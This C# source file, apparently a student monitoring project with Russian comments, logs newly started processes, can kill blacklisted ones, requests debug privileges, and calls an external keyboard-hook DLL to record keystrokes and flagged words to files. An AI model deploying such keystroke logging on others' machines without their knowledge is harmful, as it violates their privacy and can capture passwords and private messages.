using SpyAppClasses;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpyApp
{
    class SpyApp
    {
        [DllImport("SETKBHOOK.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
        public static extern void StartMonitKeys(
        [MarshalAs(UnmanagedType.LPStr)] string statsPath,
        [MarshalAs(UnmanagedType.LPStr)] string modPath,
        [MarshalAs(UnmanagedType.LPStr)] string badWordsPath);

        private SpyInfo _spyInfo;
        private List<string> _badApps;
        public SpyApp(SpyInfo spyInfo)
        {
            _spyInfo = spyInfo;
            _badApps = new List<string>();
        }
        /// <summary>
        /// Запускаем Spy с учетом SpyInfo
        /// </summary>
        public void On()
        {
            if (_spyInfo.WhereToWriteProcs != string.Empty ||
                _spyInfo.WhereToWriteBadProcs != string.Empty)
            {
                Thread procsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
                procsThread.Start();
            }
            if (_spyInfo.WhereToWriteKeys != string.Empty ||
                _spyInfo.WhereToWriteWords != string.Empty)
            {
                Thread keysThread = new Thread(new ThreadStart(PressedKeysThreadFunct));
                keysThread.Start();
            }                                  
        }
        ///processes
        private void ProcessesThreadFunct()
        {
            if (_spyInfo.WhereToReadBadApps != string.Empty)
                ReadBadAppsFromFile();

            TryGetAdminMode();

            ScanProcesses();
        }
        private void ReadBadAppsFromFile()
        {
            try
            {
                using (StreamReader sr = new StreamReader(_spyInfo.WhereToReadBadApps))
                {
                    while (!sr.EndOfStream)
                        _badApps.Add(sr.ReadLine());
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        private void TryGetAdminMode()
        {
            try
            {
                //запускаем поток с правами администратора
                Process.EnterDebugMode();
                Console.WriteLine("Admin mode!");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + ". " +
                    "Приложение запущено без прав администратора " +
                    "(системные процессы отслежены не будут!)");
            }
        }
        private void ScanProcesses()
        {
            Console.WriteLine("Scan processes...");
            var currProcsList =
                Process.GetProcesses()
                .ToList();

            while (true)
            {
                var updProcsList =
                    Process.GetProcesses()
                    .ToList();

                var addedPrcs =
                    ComputeAddedProcs(currProcsList, updProcsList);

                if (addedPrcs.Count > 0)
                    LogAddedProcs(addedPrcs);

                currProcsList = updProcsList;
            }
        }
        private List<Process> ComputeAddedProcs(List<Process> oldPrcs, List<Process> newPrcs)
        {
            List<Process> addedProcs = new List<Process>();

            foreach (var np in newPrcs)
            {
                if (oldPrcs.Any(op => op.Id == np.Id) == false)
                    addedProcs.Add(np);
            }

            return addedProcs;
        }
        private void LogAddedProcs(List<Process> prcs)
        {
            string info = string.Empty;

            foreach (var p in prcs)
            {
                info += GetProcInfo(p);

                if (IsProcessBad(p))
                {
                    if (_spyInfo.WhereToWriteBadProcs != "")
                        WriteToFile(_spyInfo.WhereToWriteBadProcs, info);

                    if (_spyInfo.IsCloseBadApp)
                        p.Kill();
                }

                if(_spyInfo.WhereToWriteProcs!="")
                    WriteToFile(_spyInfo.WhereToWriteProcs, info);
            }           
        }
        private string GetProcInfo(Process prc)
        {
            string info = string.Empty;

            try
            {
                info = $"{prc.StartTime} | id = {prc.Id} | {prc.ProcessName} \n";
            }
            catch(Exception e)
            {
                info = e.Message + " : " + prc.ProcessName + "\n";
                //Console.WriteLine(e.Message);
            }

            return info;
        }
        private bool IsProcessBad(Process prc)
        {
            if (_badApps.Count == 0)
                return false;

            if (_badApps.Any(ba => ba == prc.ProcessName))
                return true;

            return false;
        }
        private void WriteToFile(string path, string info)
        {
            using (StreamWriter sw = new StreamWriter(path, true))
            {
                sw.Write(info);
            }
        }
        
        ///keys
        private void PressedKeysThreadFunct()
        {
            StartMonitKeys(
                _spyInfo.WhereToWriteKeys, 
                _spyInfo.WhereToWriteWords, 
                _spyInfo.WhereToReadBadWords);
        }
    }
}
